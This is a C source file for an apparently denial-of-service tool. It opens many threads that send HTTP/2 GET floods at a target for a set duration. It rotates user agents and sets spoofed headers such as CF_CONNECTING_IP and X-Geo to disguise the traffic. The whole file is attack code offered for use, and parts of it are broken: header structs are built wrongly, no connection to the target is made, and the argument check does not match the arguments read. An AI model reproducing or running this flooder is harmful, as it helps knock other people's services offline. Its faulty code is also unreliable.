#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <nghttp2/nghttp2.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>

#define MAX_HEADERS 100
#define USER_AGENT_FILE "user_agents.txt"
#define BUFFER_SIZE 2048

typedef struct {
    const char *target;
    int duration;
    int concs;
    int limit;
    int spoof;
    const char *country_code;
} thread_args_t;

char user_agents[100][BUFFER_SIZE];
int user_agent_count = 0;
int requests_per_second = 0;

void load_user_agents() {
    FILE *file = fopen(USER_AGENT_FILE, "r");
    if (!file) {
        perror("Could not open user agent file");
        exit(EXIT_FAILURE);
    }

    while (fgets(user_agents[user_agent_count], BUFFER_SIZE, file) != NULL) {
        user_agents[user_agent_count][strcspn(user_agents[user_agent_count], "\n")] = 0; // Remove newline
        user_agent_count++;
    }
    fclose(file);
}

void set_headers(nghttp2_hdr *headers, const char *ua, int spoof, const char *country_code) {
    // Set User-Agent header
    headers[0] = (nghttp2_hdr){":method", "GET", NGHTTP2_HD_VAL, 0};
    headers[1] = (nghttp2_hdr){":scheme", "https", NGHTTP2_HD_VAL, 0};
    headers[2] = (nghttp2_hdr){":path", "/", NGHTTP2_HD_VAL, 0};
    headers[3] = (nghttp2_hdr){"user-agent", ua, NGHTTP2_HD_VAL, 0};

    if (spoof) {
        char spoof_header[BUFFER_SIZE];
        snprintf(spoof_header, sizeof(spoof_header), "X-Geo: %s", country_code);
        headers[4] = (nghttp2_hdr){"X-Geo", spoof_header, NGHTTP2_HD_VAL, 0};
    } else {
        headers[4] = (nghttp2_hdr){"X-Geo", "X-Geo: US", NGHTTP2_HD_VAL, 0}; // Default to US if not spoofing
    }

    // Add additional headers
    headers[5] = (nghttp2_hdr){"CACHE_INFO", "127.0.0.1", NGHTTP2_HD_VAL, 0};
    // Add more headers as necessary
    headers[6] = (nghttp2_hdr){"CF_CONNECTING_IP", "127.0.0.1", NGHTTP2_HD_VAL, 0};
    // ... add more headers similarly

    headers[7] = (nghttp2_hdr){NULL, NULL, 0, 0}; // End of headers
}

void *make_requests(void *args) {
    thread_args_t *t_args = (thread_args_t *)args;

    time_t end_time = time(NULL) + t_args->duration;
    nghttp2_session *session;
    nghttp2_session_callbacks *callbacks;

    nghttp2_session_callbacks_new(&callbacks);
    nghttp2_session_client_new(&session, callbacks, NULL);
    nghttp2_session_callbacks_del(callbacks);

    while (time(NULL) < end_time) {
        nghttp2_hdr headers[MAX_HEADERS];
        const char *ua = user_agents[rand() % user_agent_count];

        set_headers(headers, ua, t_args->spoof, t_args->country_code);

        if (nghttp2_submit_request(session, NULL, headers, NULL, NULL, NULL) != 0) {
            fprintf(stderr, "Failed to submit request\n");
            break;
        }

        if (requests_per_second > 0) {
            usleep(1000000 / requests_per_second); // Limit the rate of requests
        }

        nghttp2_session_send(session);
        nghttp2_session_recv(session);
    }

    nghttp2_session_del(session);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        fprintf(stderr, "Usage: %s <target> <duration> <concs> <limit> <ua> <spoof y/n> <spoof-country>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target = argv[1];
    int duration = atoi(argv[2]);
    int concs = atoi(argv[3]);
    requests_per_second = atoi(argv[4]);
    const char *ua = argv[5];
    int spoof = (argv[6][0] == 'y') ? 1 : 0;
    const char *country_code = argv[7];

    load_user_agents();

    pthread_t *threads = malloc(concs * sizeof(pthread_t));
    thread_args_t *t_args = malloc(concs * sizeof(thread_args_t));

    for (int i = 0; i < concs; i++) {
        t_args[i] = (thread_args_t){target, duration, concs, requests_per_second, spoof, country_code};
        pthread_create(&threads[i], NULL, make_requests, &t_args[i]);
    }

    for (int i = 0; i < concs; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(t_args);
    return EXIT_SUCCESS;
}
